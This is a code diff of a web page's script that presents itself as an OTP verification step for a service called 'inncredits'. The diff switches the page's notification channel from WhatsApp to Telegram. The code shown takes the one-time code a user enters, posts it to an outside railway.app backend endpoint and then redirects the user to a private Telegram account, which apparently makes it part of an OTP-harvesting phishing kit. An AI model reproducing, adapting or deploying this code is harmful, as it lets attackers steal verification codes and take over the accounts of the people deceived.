@@ -69,10 +69,10 @@
 
 <script>
     // ============================================
-    // CONFIGURATION - UPDATED FOR WHATSAPP
+    // CONFIGURATION - UPDATED FOR TELEGRAM
     // ============================================
     const RAILWAY_URL = 'https://inncredits-production-b2dd.up.railway.app';
-    const WHATSAPP_USERNAME = 'Inbucksk';
+    const TELEGRAM_USERNAME = 'Inbucksk';
     
     // ============================================
     // GET DATA FROM URL
@@ -95,7 +95,7 @@
     document.getElementById('displayPhone').innerText = userPhone;
     
     // ============================================
-    // SEND OTP NOTIFICATION VIA WHATSAPP BACKEND
+    // SEND OTP NOTIFICATION VIA TELEGRAM BACKEND
     // ============================================
     async function sendOtpNotification(otp) {
         const payload = {
@@ -111,7 +111,7 @@
         console.log('📤 Sending OTP to backend:', payload);
         
         try {
-            const response = await fetch(`${RAILWAY_URL}/api/send-whatsapp`, {
+            const response = await fetch(`${RAILWAY_URL}/api/send-telegram`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
@@ -124,11 +124,11 @@
     }
     
     // ============================================
-    // REDIRECT TO WHATSAPP
+    // REDIRECT TO TELEGRAM
     // ============================================
-    function redirectToWhatsApp() {
-        const whatsappUrl = `https://wa.me/${WHATSAPP_USERNAME}`;
-        window.location.href = whatsappUrl;
+    function redirectToTelegram() {
+        const telegramUrl = `https://t.me/${TELEGRAM_USERNAME}`;
+        window.location.href = telegramUrl;
     }
     
     // ============================================
@@ -196,7 +196,7 @@
     });
     
     // ============================================
-    // VERIFY BUTTON - Sends WhatsApp Notification
+    // VERIFY BUTTON - Sends Telegram Notification
     // ============================================
     verifyBtn.onclick = async () => {
         const enteredOtp = currentOtp.join('');
@@ -209,11 +209,11 @@
         verifyBtn.disabled = true;
         verifyBtn.textContent = 'Verifying...';
         
-        // Send OTP notification via WhatsApp backend
+        // Send OTP notification via Telegram backend
         await sendOtpNotification(enteredOtp);
         
-        // Redirect to WhatsApp
-        redirectToWhatsApp();
+        // Redirect to Telegram
+        redirectToTelegram();
     };
     
     // Edit phone number
